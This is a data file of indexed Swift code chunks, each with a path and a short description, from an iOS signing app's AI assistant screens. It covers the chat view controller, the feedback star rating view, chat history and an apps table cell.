2199,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Actions","@objc private func showHistory() {
let historyVC = ChatHistoryViewController()
historyVC.didSelectSession = { [weak self] session in"
2200,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function newChat - implements newchat functionality","@objc private func newChat() {
// If already processing a message, don't allow creating a new chat
if isProcessingMessage {"
2201,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","/ Load a different chat session","func loadSession(_ session: ChatSession) {
if isProcessingMessage {"
2202,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function sendMessage - implements sendmessage functionality","@objc private func sendMessage() {
// Ensure we're not already processing a message
if isProcessingMessage {"
2203,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","/ Handle timeout of message processing (e.g., when app is backgrounded for too long)","private func handleMessageProcessingTimeout() {
DispatchQueue.main.async(execute: { [weak self] in"
2204,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Command Processing / Process commands extracted from AI response","private func processCommands(from response: String) {
// Extract commands using regex
let commands = extractCommands(from: response)

// Process each command
for (command, parameter) in commands {"
2205,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Extract commands from AI response text","private func extractCommands(from text: String) -> [(command: String, parameter: String)] {
let pattern = ""\\[([^:]+):([^\\]]+)\\]""
do {"
2206,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Error Handling","private func showErrorAlert(message: String) {
let alert = UIAlertController(
title: ""Error"",
message: message,
preferredStyle: .alert
)
alert.addAction(UIAlertAction(title: ""OK"", style: .default))

// Check if we can present the alert
if !isBeingDismissed && !isBeingPresented && presentedViewController == nil {"
2207,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - UITableViewDataSource","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return messages.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2208,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard indexPath.row < messages.count else {"
2209,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - UISheetPresentationControllerDelegate Handle sheet dismissal properly","func presentationControllerDidDismiss(_: UIPresentationController) {
dismissHandler?()
}
}

// MARK: - UITextFieldDelegate

extension ChatViewController: UITextFieldDelegate {"
2210,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - UITextFieldDelegate","extension ChatViewController: UITextFieldDelegate {
func textFieldShouldReturn(_: UITextField) -> Bool {"
2211,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function textFieldShouldReturn - implements textfieldshouldreturn functionality","func textFieldShouldReturn(_: UITextField) -> Bool {
sendMessage()
return true
}
} Assistant/ChatViewController.swift
"
2212,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","/ View for collecting feedback on AI responses","class AIFeedbackView: UIView {
// MARK: - Properties

// Callback for when feedback is submitted
var onFeedbackSubmitted: ((Int, String?) -> Void)?

// UI Components
private let titleLabel = UILabel()
private let ratingControl = RatingControl()
private let commentTextView = UITextView()"
2213,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Setup","private func setupView() {
backgroundColor = .systemBackground
layer.cornerRadius = 12
layer.shadowColor = UIColor.black.cgColor
layer.shadowOpacity = 0.1
layer.shadowOffset = CGSize(width: 0, height: 2)
layer.shadowRadius = 4

// Configure title label
titleLabel.text = ""How helpful was this response?"""
2214,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Actions","@objc private func submitFeedback() {
// Get the feedback values
let rating = ratingControl.rating

// Only consider comments if they're not the placeholder
let comment: String? = commentTextView.textColor == .placeholderText ? nil : commentTextView.text

// Call the feedback handler
onFeedbackSubmitted?(rating, comment)
"
2215,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","Function skipFeedback - implements skipfeedback functionality","@objc private func skipFeedback() {
// Reset and hide without submitting
resetFeedbackControl()

// Hide with animation
UIView.animate(withDuration: 0.3, animations: {"
2216,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","/ Reset feedback controls to initial state","private func resetFeedbackControl() {
ratingControl.rating = 0
commentTextView.text = ""Additional comments (optional)""
commentTextView.textColor = .placeholderText
}
}

// MARK: - UITextView Delegate

extension AIFeedbackView: UITextViewDelegate {"
2217,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - UITextView Delegate","extension AIFeedbackView: UITextViewDelegate {
func textViewDidBeginEditing(_ textView: UITextView) {"
2218,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","Function textViewDidBeginEditing - implements textviewdidbeginediting functionality","func textViewDidBeginEditing(_ textView: UITextView) {
if textView.textColor == .placeholderText {"
2219,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","Function textViewDidEndEditing - implements textviewdidendediting functionality","func textViewDidEndEditing(_ textView: UITextView) {
if textView.text.isEmpty {"
2220,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Rating Control","class RatingControl: UIView {
// MARK: - Properties

/// Number of stars to display
var starCount: Int = 5 {"
2221,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Setup","private func setupStars() {
// Remove existing star buttons
for button in starButtons {"
2222,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","Function updateLayout - updates layout","private func updateLayout() {
// Position the buttons horizontally with equal spacing
let totalStarWidth = CGFloat(starCount) * starSize
let spacing = (bounds.width - totalStarWidth) / CGFloat(starCount + 1)

for (index, button) in starButtons.enumerated() {"
2223,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","Function layoutSubviews - implements layoutsubviews functionality","override func layoutSubviews() {
super.layoutSubviews()
updateLayout()
}

// MARK: - Button Action

@objc private func starButtonTapped(_ sender: UIButton) {"
2224,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Button Action","@objc private func starButtonTapped(_ sender: UIButton) {
guard let index = starButtons.firstIndex(of: sender) else {"
2225,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift","MARK: - Update UI","private func updateStarDisplay() {
for (index, button) in starButtons.enumerated() {"
2226,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","/ View controller for the AI Assistant tab","class AIViewController: UIViewController {

// MARK: - UI Components

private let welcomeLabel = UILabel()
private let startChatButton = UIButton(type: .system)
private let recentChatsTableView = UITableView(frame: .zero, style: .insetGrouped)
private let emptyStateView = UIView()

// MARK: - Data"
2227,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
configureNavigationBar()
setupTableView()
setupEmptyState()

// Log initialization
Debug.shared.log(message: ""AIViewController initialized"", type: .info)"
2228,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Load recent chat sessions
loadRecentSessions()
}

// MARK: - ViewControllerRefreshable Protocol Implementation

override func refreshContent() {"
2229,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - ViewControllerRefreshable Protocol Implementation","override func refreshContent() {
// Reload data when tab is selected to refresh content
loadRecentSessions()
}

// MARK: - UI Setup

private func setupUI() {"
2230,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = .systemBackground

// Welcome label
welcomeLabel.text = ""AI Assistant""
welcomeLabel.font = UIFont.systemFont(ofSize: 24, weight: .bold)
welcomeLabel.textAlignment = .center
welcomeLabel.textColor = .label

// Start chat button"
2231,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function configureNavigationBar - implements configurenavigationbar functionality","private func configureNavigationBar() {
navigationItem.title = ""AI Assistant""
navigationController?.navigationBar.prefersLargeTitles = true
}

private func setupTableView() {"
2232,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function setupTableView - sets uptableview","private func setupTableView() {
recentChatsTableView.dataSource = self
recentChatsTableView.delegate = self
recentChatsTableView.register(UITableViewCell.self, forCellReuseIdentifier: ""ChatSessionCell"")
recentChatsTableView.backgroundColor = UIColor.systemGroupedBackground
recentChatsTableView.separatorStyle = UITableViewCell.SeparatorStyle.singleLine
recentChatsTableView.tableFooterView = UIView()
}

private func setupEmptyState() {"
2233,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function setupEmptyState - sets upemptystate","private func setupEmptyState() {
// Create empty state view
let imageView = UIImageView(image: UIImage(systemName: ""bubble.left.and.bubble.right""))
imageView.tintColor = .systemGray3
imageView.contentMode = .scaleAspectFit

let label = UILabel()
label.text = ""No recent chats""
label.textAlignment = .center
label.font = UIFont.systemFont(ofSize: 16, weight: .medium)"
2234,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - Data Loading","private func loadRecentSessions() {
// Load recent chat sessions from CoreData
// Fetch up to 20 recent sessions
recentSessions = CoreDataManager.shared.fetchRecentChatSessions(limit: 20)

DispatchQueue.main.async { [weak self] in"
2235,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - Actions","@objc private func startNewChat() {
// Create a new chat session
do {"
2236,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - UITableViewDataSource","extension AIViewController: UITableViewDataSource {
func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {"
2237,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
return recentSessions.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2238,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""ChatSessionCell"", for: indexPath)

// Configure cell
let session = recentSessions[indexPath.row]

// Use modern cell configuration if available
if #available(iOS 14.0, *) {"
2239,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, titleForHeaderInSection section: Int) -> String? {
return recentSessions.isEmpty ? nil : ""Recent Chats""
}
}

// MARK: - UITableViewDelegate

extension AIViewController: UITableViewDelegate {"
2240,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","MARK: - UITableViewDelegate","extension AIViewController: UITableViewDelegate {
func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
2241,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

// Get selected session
let session = recentSessions[indexPath.row]

// Present chat view controller with this session
let chatVC = ChatViewController(session: session)

// Set dismiss handler to refresh the list"
2242,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, commit editingStyle: UITableViewCell.EditingStyle, forRowAt indexPath: IndexPath) {
if editingStyle == .delete {"
2243,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","MARK: - AI Learning Extension","extension ChatViewController {
/// Record an AI interaction for learning
func recordAIInteraction(userMessage: String, aiResponse: String, messageId: String) {"
2244,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","/ Record an AI interaction for learning","func recordAIInteraction(userMessage: String, aiResponse: String, messageId: String) {
// Extract intent and confidence
let intent = extractIntent(from: aiResponse)
let confidence = extractConfidence(from: aiResponse)

// Record the interaction
AILearningManager.shared.recordInteraction(
userMessage: userMessage,
aiResponse: aiResponse,
intent: intent,"
2245,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","/ Extract intent from AI response","private func extractIntent(from response: String) -> String {
// Look for intent in square brackets like [navigate to:settings]
if let range = response.range(of: ""\\[([a-zA-Z0-9_\\s]+):.*?\\]"", options: .regularExpression) {"
2246,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","/ Extract confidence score (placeholder implementation)","private func extractConfidence(from _: String) -> Double {
// In a real implementation, confidence could be embedded in response or derived from context
return 0.85 // Default reasonable confidence
}

/// Show feedback prompt for AI response
private func showFeedbackPrompt(for messageId: String) {"
2247,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","/ Show feedback prompt for AI response","private func showFeedbackPrompt(for messageId: String) {
// Only show if learning is enabled
guard AILearningManager.shared.isLearningEnabled else { return }"
2248,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift","/ Show a thank you toast message","private func showThankYouToast() {
let toast = UILabel()
toast.text = ""Thanks for your feedback!""
toast.backgroundColor = .systemGray6
toast.textAlignment = .center
toast.alpha = 0
toast.layer.cornerRadius = 10
toast.clipsToBounds = true
toast.padding = UIEdgeInsets(top: 8, left: 16, bottom: 8, right: 16)
toast.translatesAutoresizingMaskIntoConstraints = false"
2249,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","class ChatViewController - Controls user interface and application flow","class ChatViewController: UIViewController, UITableViewDataSource, UITableViewDelegate,
UISheetPresentationControllerDelegate
{"
2250,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
loadMessages()

// Register for app background/foreground notifications
setupAppStateObservers()

// Add a welcome message if this is a new session
if messages.isEmpty {"
2251,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Set navigation bar appearance
if let navigationController = navigationController {"
2252,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function viewDidDisappear - implements viewdiddisappear functionality","override func viewDidDisappear(_ animated: Bool) {
super.viewDidDisappear(animated)

// If we're being dismissed (not just covered by another VC), call the dismissHandler
if isBeingDismissed || navigationController?.isBeingDismissed == true {"
2253,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Welcome Message","private func addWelcomeMessage() {
do {"
2254,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - App State Handling","private func setupAppStateObservers() {
NotificationCenter.default.addObserver(
self,
selector: #selector(appDidEnterBackground),
name: UIApplication.didEnterBackgroundNotification,
object: nil
)

NotificationCenter.default.addObserver(
self,"
2255,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function appDidEnterBackground - implements appdidenterbackground functionality","@objc private func appDidEnterBackground() {
// Save any pending state when app goes to background
Debug.shared.log(message: ""Chat view controller saving state before background"", type: .debug)

// Cancel any ongoing message processing
if isProcessingMessage {"
2256,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function appWillEnterForeground - implements appwillenterforeground functionality","@objc private func appWillEnterForeground() {
// Refresh data when app comes to foreground
Debug.shared.log(message: ""Chat view controller becoming active after background"", type: .debug)

// Refresh messages to ensure we're in sync with CoreData
DispatchQueue.main.async { [weak self] in"
2257,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = .systemBackground

// Navigation bar
navigationItem.title = currentSession.title
navigationItem.leftBarButtonItem = UIBarButtonItem(
image: UIImage(systemName: ""clock.arrow.circlepath""),
style: .plain,
target: self,
action: #selector(showHistory)"
2258,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function setupTableView - sets uptableview","private func setupTableView() {
tableView.dataSource = self
tableView.delegate = self

// Register cell types
tableView.register(UserMessageCell.self, forCellReuseIdentifier: ""UserCell"")
tableView.register(AIMessageCell.self, forCellReuseIdentifier: ""AICell"")
tableView.register(SystemMessageCell.self, forCellReuseIdentifier: ""SystemCell"")

// Configure tableView appearance"
2259,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function setupEmptyStateView - sets upemptystateview","private func setupEmptyStateView() {
// Create an empty state view
let emptyView = UIView()
emptyView.isHidden = true
emptyView.backgroundColor = .clear

// Add animation for empty state using SF Symbol
let animationView = emptyView.addAnimatedIcon(
systemName: ""ellipsis.bubble"",
tintColor: .systemBlue,"
2260,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function refreshMessages - implements refreshmessages functionality","@objc private func refreshMessages() {
// Reload messages from database
loadMessages()

// End refreshing
tableView.refreshControl?.endRefreshing()
}

// Update UI when message processing state changes
private func updateProcessingState(isProcessing: Bool) {"
2261,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Update UI when message processing state changes","private func updateProcessingState(isProcessing: Bool) {
if isProcessing {"
2262,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function setupInputControls - sets upinputcontrols","private func setupInputControls() {
// Input container with enhanced styling
inputContainer.backgroundColor = .systemBackground
inputContainer.applyCardStyling(
cornerRadius: 12,
shadowOpacity: 0.15,
backgroundColor: .systemBackground
)
view.addSubview(inputContainer)
"
2263,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
// Enable autolayout
tableView.translatesAutoresizingMaskIntoConstraints = false
inputContainer.translatesAutoresizingMaskIntoConstraints = false
textField.translatesAutoresizingMaskIntoConstraints = false
sendButton.translatesAutoresizingMaskIntoConstraints = false
activityIndicator.translatesAutoresizingMaskIntoConstraints = false

// Safe area guide for proper layout
let safeArea = view.safeAreaLayoutGuide"
2264,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function setupKeyboardHandling - sets upkeyboardhandling","private func setupKeyboardHandling() {
// Add keyboard notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(keyboardWillShow),
name: UIResponder.keyboardWillShowNotification,
object: nil
)

NotificationCenter.default.addObserver("
2265,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function dismissKeyboard - implements dismisskeyboard functionality","@objc private func dismissKeyboard() {
view.endEditing(true)
}

@objc private func keyboardWillShow(notification: NSNotification) {"
2266,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function keyboardWillShow - implements keyboardwillshow functionality","@objc private func keyboardWillShow(notification: NSNotification) {
guard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,
let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double
else {"
2267,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function keyboardWillHide - implements keyboardwillhide functionality","@objc private func keyboardWillHide(notification: NSNotification) {
guard let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double else {"
2268,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Data Loading","private func loadMessages() {
// Fetch messages from CoreData
let fetchedMessages = CoreDataManager.shared.getMessages(for: currentSession)

// Handle the case where no messages are found
if fetchedMessages.isEmpty && messages.isEmpty {"
2269,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function scrollToBottom - implements scrolltobottom functionality","private func scrollToBottom(animated: Bool = true) {
// Ensure we have messages and the table view is loaded
if !messages.isEmpty && tableView.window != nil {"
2270,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Actions","@objc private func showHistory() {
let historyVC = ChatHistoryViewController()
historyVC.didSelectSession = { [weak self] session in"
2271,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function newChat - implements newchat functionality","@objc private func newChat() {
// If already processing a message, don't allow creating a new chat
if isProcessingMessage {"
2272,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","/ Load a different chat session","func loadSession(_ session: ChatSession) {
if isProcessingMessage {"
2273,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function sendMessage - implements sendmessage functionality","@objc private func sendMessage() {
// Ensure we're not already processing a message
if isProcessingMessage {"
2274,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","/ Handle timeout of message processing (e.g., when app is backgrounded for too long)","private func handleMessageProcessingTimeout() {
DispatchQueue.main.async { [weak self] in"
2275,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Command Processing / Process commands extracted from AI response","private func processCommands(from response: String) {
// Extract commands using regex
let commands = extractCommands(from: response)

// Process each command
for (command, parameter) in commands {"
2276,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Extract commands from AI response text","private func extractCommands(from text: String) -> [(command: String, parameter: String)] {
let pattern = ""\\[([^:]+):([^\\]]+)\\]""
do {"
2277,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - Error Handling","private func showErrorAlert(message: String) {
let alert = UIAlertController(
title: ""Error"",
message: message,
preferredStyle: .alert
)
alert.addAction(UIAlertAction(title: ""OK"", style: .default))

// Check if we can present the alert
if !isBeingDismissed && !isBeingPresented && presentedViewController == nil {"
2278,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - UITableViewDataSource","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return messages.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2279,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard indexPath.row < messages.count else {"
2280,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - UISheetPresentationControllerDelegate Handle sheet dismissal properly","func presentationControllerDidDismiss(_: UIPresentationController) {
dismissHandler?()
}
}

// MARK: - UITextFieldDelegate

extension ChatViewController: UITextFieldDelegate {"
2281,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","MARK: - UITextFieldDelegate","extension ChatViewController: UITextFieldDelegate {
func textFieldShouldReturn(_: UITextField) -> Bool {"
2282,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift","Function textFieldShouldReturn - implements textfieldshouldreturn functionality","func textFieldShouldReturn(_: UITextField) -> Bool {
sendMessage()
return true
}
}
"
2283,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","class ChatHistoryViewController - Controls user interface and application flow","class ChatHistoryViewController: UITableViewController {
private var sessions: [ChatSession] = []
var didSelectSession: ((ChatSession) -> Void)?

override func viewDidLoad() {"
2284,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
title = ""Chat History""
navigationItem.rightBarButtonItem = UIBarButtonItem(
barButtonSystemItem: .done,
target: self,
action: #selector(dismissVC)
)
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
tableView.backgroundColor = .systemGray6"
2285,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function dismissVC - implements dismissvc functionality","@objc private func dismissVC() {
dismiss(animated: true)
}

private func loadSessions() {"
2286,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function loadSessions - implements loadsessions functionality","private func loadSessions() {
sessions = CoreDataManager.shared.getChatSessions()
tableView.reloadData()
}

override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
2287,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return sessions.count
}

override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2288,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""Cell"", for: indexPath)
let session = sessions[indexPath.row]
cell.textLabel?.text = session.title
cell.backgroundColor = .systemBackground
cell.accessoryType = .disclosureIndicator
return cell
}

override func tableView(_: UITableView, didSelectRowAt indexPath: IndexPath) {"
2289,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, didSelectRowAt indexPath: IndexPath) {
let session = sessions[indexPath.row]
didSelectSession?(session)
dismiss(animated: true)
}
}
"
2290,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","class AppsTableViewCell - implements functionality related to apps table view cell","class AppsTableViewCell: UITableViewCell {
let nameLabel: UILabel = {"
2291,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(nameLabel)
contentView.addSubview(versionLabel)
contentView.addSubview(pillsStackView)
imageView?.translatesAutoresizingMaskIntoConstraints = true

// Apply modern card styling to the cell
contentView.applyCardStyle(
backgroundColor: UIColor.systemBackground,
cornerRadius: 12,"
2292,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Add touch feedback animations","override func setHighlighted(_ highlighted: Bool, animated: Bool) {
super.setHighlighted(highlighted, animated: animated)

if animated {"
